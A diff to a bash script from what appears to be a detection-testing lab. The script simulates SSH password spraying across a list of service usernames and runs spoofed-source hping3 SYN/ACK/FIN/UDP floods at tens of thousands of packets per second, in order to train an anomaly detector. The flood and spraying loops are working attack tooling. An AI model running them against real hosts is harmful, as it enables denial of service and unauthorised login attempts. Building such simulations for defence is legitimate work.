@@ -2,17 +2,73 @@
 
 set -euo pipefail
 
-VICTIM_IP="${1:-scenario_victim}"
+VICTIM_IP="${1:-victima}"
 VICTIM_PORT="${2:-2222}"
+CAMPAIGN_ID="${CAMPAIGN_ID:-${3:-}}"
 LOG_DIR="${NOVADEF_LOG_DIR:-/var/novadef/logs}"
 OUTPUT_FILE="${LOG_DIR}/password_spraying_attempts.jsonl"
-SLEEP_SECONDS="${SLEEP_SECONDS:-1}"
+STOP_SIGNAL_FILE="${LOG_DIR}/stop_network_attack.signal"
+# Pequeña pausa entre rondas del bucle sostenido (tras la rampa inicial) para
+# que el volumen agregado oscile en vez de formar una meseta perfectamente
+# plana — produce una curva más natural/escalonada en la gráfica de tráfico.
+SLEEP_SECONDS="${SLEEP_SECONDS:-0.4}"
+CONNECT_TIMEOUT="${CONNECT_TIMEOUT:-1}"
+COMMAND_TIMEOUT="${COMMAND_TIMEOUT:-0.25}"
+PROBE_TIMEOUT="${PROBE_TIMEOUT:-1.0}"
+ATTACK_DURATION_SECONDS="${ATTACK_DURATION_SECONDS:-600}"
+SOURCE_BATCH_SIZE="${SOURCE_BATCH_SIZE:-16}"
+ATTEMPTS_PER_PAIR="${ATTEMPTS_PER_PAIR:-3}"
+# 300 paquetes por fuente por ronda con intervalo 200us → ~5000 pkt/s por fuente,
+# 16 fuentes en paralelo → pico de ~80.000 pkt/s agregados. Esto crea un salto
+# 100-1000x sobre el baseline benigno (30-60 pps), fácilmente detectable por
+# Isolation Forest sin necesidad de campaign_id.
+PROBE_BURST="${PROBE_BURST:-300}"
+INITIAL_SURGE_PACKETS_PER_SOURCE="${INITIAL_SURGE_PACKETS_PER_SOURCE:-500}"
+SOURCE_IP_START="${SOURCE_IP_START:-160}"
+SOURCE_IP_END="${SOURCE_IP_END:-175}"
+TARGET_USER_LIMIT="${TARGET_USER_LIMIT:-6}"
+ATTEMPT_SLEEP_SECONDS="${ATTEMPT_SLEEP_SECONDS:-0.05}"
+# 200us entre paquetes hping3 → ~5000 pkt/s por fuente
+HPING_INTERVAL_US="${HPING_INTERVAL_US:-200}"
+if ! [[ "${HPING_INTERVAL_US}" =~ ^[0-9]+$ ]] || [ "${HPING_INTERVAL_US}" -lt 100 ]; then
+  HPING_INTERVAL_US=200
+fi
+# NOTA (realismo): el atacante NO publica nada a Kafka. En un ataque real el
+# adversario nunca alimentaría la cola de mensajes del defensor. La detección
+# es 100% por OBSERVACIÓN PASIVA: tshark captura los paquetes de red que este
+# script genera (hping3 + intentos SSH reales) y CICFlowMeter deriva los flujos;
+# el detector de anomalías (Isolation Forest) infiere el ataque de esa telemetría
+# (volumen, tasa, distribución de IPs de origen, puerto objetivo). El fichero
+# OUTPUT_FILE se mantiene solo como evidencia forense local del atacante.
 
 mkdir -p "${LOG_DIR}"
-# Recreate file with a fresh inode so Filebeat filestream resets offset
-# and reliably ingests each experiment run from the beginning.
 rm -f "${OUTPUT_FILE}"
 touch "${OUTPUT_FILE}"
+# Clear any leftover stop signal from a PRIOR run — the API's startup sweep
+# (_kill_network_attack_everywhere) touches this same file to stop a stray
+# attack process on a reused scenario, but never removes it afterward. Without
+# this, a fresh invocation of this script finds the signal already present
+# and breaks out of its main loop on the very first check, before completing
+# any round at all.
+rm -f "${STOP_SIGNAL_FILE}"
+
+stop_attack_children() {
+  pkill -TERM -P $$ sshpass 2>/dev/null || true
+  pkill -TERM -P $$ ssh 2>/dev/null || true
+  pkill -TERM -P $$ hping3 2>/dev/null || true
+  pkill -TERM hping3 2>/dev/null || true
+}
+
+watch_stop_signal() {
+  while [ ! -f "${STOP_SIGNAL_FILE}" ]; do
+    sleep 0.1
+  done
+  stop_attack_children
+}
+
+watch_stop_signal &
+WATCHER_PID=$!
+trap 'kill "${WATCHER_PID}" 2>/dev/null || true; stop_attack_children' EXIT
 
 resolved_victim_ip="$(getent ahostsv4 "${VICTIM_IP}" | awk 'NR==1 {print $1}')"
 if [ -n "${resolved_victim_ip}" ]; then
@@ -21,13 +77,17 @@ else
   VICTIM_TARGET="${VICTIM_IP}"
 fi
 
-SOURCE_IPS=(
-  "172.18.0.50"
-  "172.18.0.51"
-  "172.18.0.52"
-  "172.18.0.53"
-  "172.18.0.54"
-)
+# Evidencia forense local del atacante (no se envía a ningún sistema del
+# defensor). La detección la hace el defensor observando la red con tshark.
+seed_ts="$(date +%s.%3N)"
+printf '{"src_ip":"%s","dst_ip":"%s","dst_port":%s,"protocol":"tcp","username":"%s","auth_success":false,"attempt":%s,"timestamp":%s}\n' \
+  "172.18.0.160" "${VICTIM_TARGET}" "${VICTIM_PORT}" "admin" "0" "${seed_ts}" >> "${OUTPUT_FILE}"
+
+SOURCE_IPS=()
+# Rango configurable para simular múltiples orígenes sin saturar la escena.
+for last_octet in $(seq "${SOURCE_IP_START}" "${SOURCE_IP_END}"); do
+  SOURCE_IPS+=("172.18.0.${last_octet}")
+done
 
 TARGET_USERS=(
   "admin"
@@ -45,7 +105,24 @@ TARGET_USERS=(
   "user"
   "guest"
   "test"
+  "auditor"
+  "secops"
+  "analyst"
+  "backupsvc"
+  "service"
+  "svc-backup"
+  "svc-monitor"
+  "svc-ops"
+  "svc-support"
+  "svc-admin"
+  "svc-web"
+  "svc-db"
+  "svc-api"
 )
+if [[ "${TARGET_USER_LIMIT}" =~ ^[0-9]+$ ]] && [ "${TARGET_USER_LIMIT}" -gt 0 ] && [ "${TARGET_USER_LIMIT}" -lt "${#TARGET_USERS[@]}" ]; then
+  TARGET_USERS=("${TARGET_USERS[@]:0:${TARGET_USER_LIMIT}}")
+fi
+PROBE_MODES=("syn" "ack" "fin" "udp")
 
 iface="$(ip route get "${VICTIM_TARGET}" | awk '/dev/ {for (i = 1; i <= NF; i++) if ($i == "dev") {print $(i+1); exit}}')"
 if [ -z "${iface}" ]; then
@@ -59,23 +136,142 @@ for src_ip in "${SOURCE_IPS[@]}"; do
   fi
 done
 
-for target_user in "${TARGET_USERS[@]}"; do
-  for src_ip in "${SOURCE_IPS[@]}"; do
-    sshpass -p "WrongPassword!123" ssh \
-      -o PreferredAuthentications=password \
-      -o PubkeyAuthentication=no \
-      -o StrictHostKeyChecking=no \
-      -o UserKnownHostsFile=/dev/null \
-      -o ConnectTimeout=5 \
-      -p "${VICTIM_PORT}" \
-      -b "${src_ip}" \
-      "${target_user}@${VICTIM_TARGET}" "true" >/dev/null 2>&1 || true
+# Rampa inicial ESCALONADA (no un único salto vertical): en vez de lanzar las
+# 16 fuentes a la vez a máxima ráfaga (lo que se ve como una línea recta hacia
+# arriba en la gráfica), se sube el volumen en 3 oleadas crecientes — pocas
+# fuentes/pocos paquetes primero, más después — con una pequeña pausa entre
+# cada una. El volumen total entregado es el mismo; el perfil temporal es una
+# curva creciente en escalones en vez de un impulso instantáneo.
+if [ "${INITIAL_SURGE_PACKETS_PER_SOURCE}" -gt 0 ]; then
+  num_sources="${#SOURCE_IPS[@]}"
+  # 3 oleadas: ~25%, ~55%, 100% de las fuentes; cada fuente manda una fracción
+  # creciente de INITIAL_SURGE_PACKETS_PER_SOURCE en su oleada.
+  wave_fracs_sources="25 55 100"
+  wave_fracs_packets="30 60 100"
+  prev_src_count=0
+  wave_idx=0
+  for wave_pct_pair in "25:30" "55:60" "100:100"; do
+    src_pct="${wave_pct_pair%%:*}"
+    pkt_pct="${wave_pct_pair##*:}"
+    wave_src_count=$(( (num_sources * src_pct + 99) / 100 ))
+    [ "${wave_src_count}" -gt "${num_sources}" ] && wave_src_count="${num_sources}"
+    wave_pkts=$(( (INITIAL_SURGE_PACKETS_PER_SOURCE * pkt_pct + 99) / 100 ))
+    [ "${wave_pkts}" -lt 1 ] && wave_pkts=1
 
-    printf '{"src_ip":"%s","dst_ip":"%s","dst_port":%s,"protocol":"tcp","username":"%s","auth_success":false,"timestamp":%s}\n' \
-      "${src_ip}" "${VICTIM_TARGET}" "${VICTIM_PORT}" "${target_user}" "$(date +%s.%3N)" >> "${OUTPUT_FILE}"
+    surge_pids=()
+    surge_idx=0
+    idx=0
+    for src_ip in "${SOURCE_IPS[@]}"; do
+      idx=$((idx + 1))
+      if [ "${idx}" -gt "${wave_src_count}" ]; then
+        break
+      fi
+      (
+        timeout "${PROBE_TIMEOUT}" hping3 -q -i "u${HPING_INTERVAL_US}" -S -c "${wave_pkts}" -p "${VICTIM_PORT}" -a "${src_ip}" -M $((5000 + wave_idx * 1000 + surge_idx)) -d 24 "${VICTIM_TARGET}" >/dev/null 2>&1 || true
+      ) &
+      surge_pids+=("$!")
+      surge_idx=$((surge_idx + 1))
+      if [ "${#surge_pids[@]}" -ge "${SOURCE_BATCH_SIZE}" ]; then
+        wait "${surge_pids[@]}" || true
+        surge_pids=()
+      fi
+    done
+    if [ "${#surge_pids[@]}" -gt 0 ]; then
+      wait "${surge_pids[@]}" || true
+    fi
+    wave_idx=$((wave_idx + 1))
+    # Pausa breve entre oleadas para que la gráfica muestre escalones
+    # diferenciados en vez de una subida continua.
+    sleep "${SURGE_WAVE_GAP_SECONDS:-1.5}"
+  done
+fi
 
+start_epoch="$(date +%s)"
+round_count=0
+while :; do
+  if [ -f "${STOP_SIGNAL_FILE}" ]; then
+    break
+  fi
+  now_epoch="$(date +%s)"
+  elapsed="$((now_epoch - start_epoch))"
+  if [ "${ATTACK_DURATION_SECONDS}" -gt 0 ] && [ "${elapsed}" -ge "${ATTACK_DURATION_SECONDS}" ]; then
+    break
+  fi
+  round_count=$((round_count + 1))
+  for target_user in "${TARGET_USERS[@]}"; do
+    pids=()
+    src_idx=0
+    for src_ip in "${SOURCE_IPS[@]}"; do
+      if [ -f "${STOP_SIGNAL_FILE}" ]; then
+        stop_attack_children
+        break 2
+      fi
+      now_epoch="$(date +%s)"
+      elapsed="$((now_epoch - start_epoch))"
+      if [ "${ATTACK_DURATION_SECONDS}" -gt 0 ] && [ "${elapsed}" -ge "${ATTACK_DURATION_SECONDS}" ]; then
+        stop_attack_children
+        break 2
+      fi
+
+      (
+        if [ -f "${STOP_SIGNAL_FILE}" ]; then
+          stop_attack_children
+          exit 0
+        fi
+        probe_seed=$((round_count + src_idx))
+        probe_mode="${PROBE_MODES[$((probe_seed % ${#PROBE_MODES[@]}))]}"
+        case "${probe_mode}" in
+          syn)
+            timeout "${PROBE_TIMEOUT}" hping3 -q -i "u${HPING_INTERVAL_US}" -S -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${src_ip}" -M $((1000 + probe_seed)) -d $((16 + (probe_seed % 4) * 8)) "${VICTIM_TARGET}" >/dev/null 2>&1 || true
+            ;;
+          ack)
+            timeout "${PROBE_TIMEOUT}" hping3 -q -i "u${HPING_INTERVAL_US}" -A -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${src_ip}" -M $((2000 + probe_seed)) -d $((24 + (probe_seed % 3) * 8)) "${VICTIM_TARGET}" >/dev/null 2>&1 || true
+            ;;
+          fin)
+            timeout "${PROBE_TIMEOUT}" hping3 -q -i "u${HPING_INTERVAL_US}" -F -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${src_ip}" -M $((3000 + probe_seed)) -d $((32 + (probe_seed % 5) * 4)) "${VICTIM_TARGET}" >/dev/null 2>&1 || true
+            ;;
+          udp)
+            timeout "${PROBE_TIMEOUT}" hping3 -q -i "u${HPING_INTERVAL_US}" -2 -c "${PROBE_BURST}" -p "${VICTIM_PORT}" -a "${src_ip}" -d $((20 + (probe_seed % 4) * 6)) "${VICTIM_TARGET}" >/dev/null 2>&1 || true
+            ;;
+        esac
+        attempt=0
+        while [ "${attempt}" -lt "${ATTEMPTS_PER_PAIR}" ]; do
+          if [ -f "${STOP_SIGNAL_FILE}" ]; then
+            stop_attack_children
+            exit 0
+          fi
+          attempt=$((attempt + 1))
+          attempt_ts="$(date +%s.%3N)"
+          timeout "${COMMAND_TIMEOUT}" sshpass -p "WrongPassword!123" ssh \
+            -o PreferredAuthentications=password \
+            -o PubkeyAuthentication=no \
+            -o StrictHostKeyChecking=no \
+            -o UserKnownHostsFile=/dev/null \
+            -o ConnectTimeout="${CONNECT_TIMEOUT}" \
+            -o ConnectionAttempts=1 \
+            -p "${VICTIM_PORT}" \
+            -b "${src_ip}" \
+            "${target_user}@${VICTIM_TARGET}" "true" >/dev/null 2>&1 || true
+          # El intento SSH real anterior genera paquetes de red que tshark observa.
+          # Solo registramos evidencia forense local; el detector NO recibe nada
+          # del atacante: infiere el ataque por anomalía sobre la telemetría de red.
+          printf '{"src_ip":"%s","dst_ip":"%s","dst_port":%s,"protocol":"tcp","username":"%s","auth_success":false,"attempt":%s,"timestamp":%s}\n' \
+            "${src_ip}" "${VICTIM_TARGET}" "${VICTIM_PORT}" "${target_user}" "${attempt}" "${attempt_ts}" >> "${OUTPUT_FILE}"
+          sleep "${ATTEMPT_SLEEP_SECONDS}"
+        done
+      ) &
+      pids+=("$!")
+      src_idx=$((src_idx + 1))
+    done
+    if [ "${#pids[@]}" -gt 0 ]; then
+      wait "${pids[@]}" || true
+    fi
+    if [ -f "${STOP_SIGNAL_FILE}" ]; then
+      stop_attack_children
+      break 2
+    fi
     sleep "${SLEEP_SECONDS}"
   done
 done
 
-echo "Password spraying completado. Evidencia: ${OUTPUT_FILE}"
+echo "Password spraying completado tras ${round_count} rondas. Evidencia: ${OUTPUT_FILE}"
